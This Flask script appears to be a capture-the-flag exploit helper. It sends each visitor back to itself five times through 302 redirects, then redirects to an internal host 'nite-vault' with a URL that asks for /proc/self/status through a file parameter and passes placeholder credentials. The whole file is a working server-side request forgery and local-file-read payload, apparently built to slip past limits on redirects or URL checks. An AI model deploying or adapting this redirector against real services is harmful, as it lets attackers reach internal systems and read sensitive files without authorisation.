from flask import Flask, redirect, request
import sys

app = Flask(__name__)

REDIRECT_COUNT = 0
MAX_REDIRECTS = 6
TARGET = "http://nite-vault/view?file=/proc/self/status&username=fakeuser&password=fakepassword"  

@app.route('/')
def redirector():
    global REDIRECT_COUNT
    REDIRECT_COUNT += 1

    host = request.host
    scheme = request.scheme
    
    if REDIRECT_COUNT < MAX_REDIRECTS:
        return redirect(f"{scheme}://{host}/", code=302)
    else:
        REDIRECT_COUNT = 0
        return redirect(TARGET, code=302)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(sys.argv[1]) if len(sys.argv) > 1 else 5001)
